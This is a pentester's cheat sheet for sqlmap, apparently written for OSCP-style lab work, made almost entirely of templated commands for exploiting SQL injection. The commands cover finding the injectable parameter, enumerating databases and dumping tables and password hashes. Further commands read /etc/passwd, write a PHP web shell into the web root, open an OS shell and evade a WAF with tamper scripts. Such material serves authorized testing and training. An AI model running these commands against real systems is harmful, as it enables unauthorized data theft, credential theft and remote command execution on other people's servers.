# sqlmap

## Before I start
- [ ] Not allowed on the OSCP exam: there, by hand with :Pb sqli
- [ ] The injectable parameter found, or at least the request it is in

## Point it at the request
A GET parameter:
sqlmap -u '<Scheme>://<WebHost>/THE-PAGE?<Param>=1' -p <Param> --batch
A POST body:
sqlmap -u '<Scheme>://<WebHost>/THE-PAGE' --data '<Param>=1' -p <Param> --batch
Anything else, the request saved from Burp with right-click, Copy to file:
sqlmap -r request.txt -p <Param> --batch
Logged in, with the session cookie:
sqlmap -u '<Scheme>://<WebHost>/THE-PAGE?<Param>=1' --cookie 'THE-COOKIE' --batch
Every form on a page, two links deep:
sqlmap -u '<Scheme>://<WebHost>/THE-PAGE' --forms --crawl=2 --batch
- [ ] A value in the path or a header: a * where it injects, such as THE-PAGE/1*, in the URL or the request file

## When it finds nothing
sqlmap -r request.txt -p <Param> --batch --level=3 --risk=2
sqlmap -r request.txt -p <Param> --batch --dbms=mysql --technique=BEUST
sqlmap -r request.txt -p <Param> --batch --flush-session
- [ ] --level 2 adds cookies, 3 adds the User-Agent and Referer, 5 the Host header
- [ ] --risk 3 adds OR payloads, which can change rows in an UPDATE: only with care
- [ ] The prefix and suffix it needs, when I know them by hand: --prefix "')" --suffix '-- -'

## Who I am and what is there
sqlmap -r request.txt --batch --current-user --current-db --is-dba
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D <Database> --tables
sqlmap -r request.txt --batch -D <Database> -T <Table> --columns
sqlmap -r request.txt --batch -D <Database> -T <Table> -C THE-COLUMNS --dump
Columns with pass in the name, in every database:
sqlmap -r request.txt --batch --search -C pass
The database's own accounts and hashes:
sqlmap -r request.txt --batch --passwords
- [ ] One table at a time, never --dump-all: it is slow and hammers the target
- [ ] Everything it found is kept in ~/.local/share/sqlmap/output/, dumps as CSV

## Files and commands
sqlmap -r request.txt --batch --file-read=/etc/passwd
sqlmap -r request.txt --batch --file-write=shell.php --file-dest=/var/www/html/shell.php
sqlmap -r request.txt --batch --os-shell
sqlmap -r request.txt --batch --sql-shell
- [ ] --is-dba True, or MSSQL with xp_cmdshell: --os-shell runs commands, then a reverse shell from :Pb shells
- [ ] --os-shell on MySQL or PostgreSQL needs a web folder the database can write

## A WAF or a fragile app
sqlmap --list-tampers
sqlmap -r request.txt --batch --tamper=space2comment,between,randomcase --random-agent
sqlmap -r request.txt --batch --delay=1 --threads=1
To watch each payload in Burp:
sqlmap -r request.txt --batch --proxy=http://127.0.0.1:8080 -v 3
